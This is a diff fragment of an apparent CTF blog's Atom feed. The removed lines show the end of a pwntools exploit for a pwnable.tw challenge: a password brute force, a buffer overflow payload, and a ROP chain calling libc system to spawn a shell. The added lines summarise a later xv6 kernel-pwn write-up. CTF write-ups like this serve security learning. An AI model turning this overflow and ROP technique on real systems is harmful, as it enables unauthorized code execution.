-                <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-                <span class="k">break</span>
-        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>
-            <span class="k">print</span><span class="p">(</span><span class="s">"ERROR"</span><span class="p">)</span>
-            <span class="nb">exit</span><span class="p">()</span>
-    <span class="n">success</span><span class="p">(</span><span class="s">"password: "</span><span class="o">+</span><span class="nb">repr</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
-    <span class="c1"># pause()
-</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"passowrd"</span><span class="p">,</span> <span class="mh">0x10</span><span class="o">*</span><span class="sa">b</span><span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="o">+</span><span class="mh">0x30</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="mh">0x18</span><span class="o">*</span><span class="sa">b</span><span class="s">'a'</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="n">my_read</span><span class="p">))</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Copy :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
-
-    <span class="c1"># pause()
-</span>
-    <span class="c1"># ROP
-</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">progaddr</span><span class="o">+</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">libcaddr</span><span class="o">+</span><span class="mh">0x000000000018c177</span><span class="p">)</span><span class="o">+</span><span class="n">pack</span><span class="p">(</span><span class="n">libcaddr</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
-
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div></div>]]></content><author><name></name></author><category term="pwnable.tw" /><summary type="html"><![CDATA[本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……]]></summary></entry></feed>
+<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311290204319.png" alt="" /></p>]]></content><author><name></name></author><category term="pwn" /><category term="riscv" /><category term="kernel-pwn" /><summary type="html"><![CDATA[第一次打内核题，虽然是xv6但还是感觉非常酷。比赛结束前才想到了真的可行的思路，赛后结合官方 writeup 调出来了。]]></summary></entry></feed>
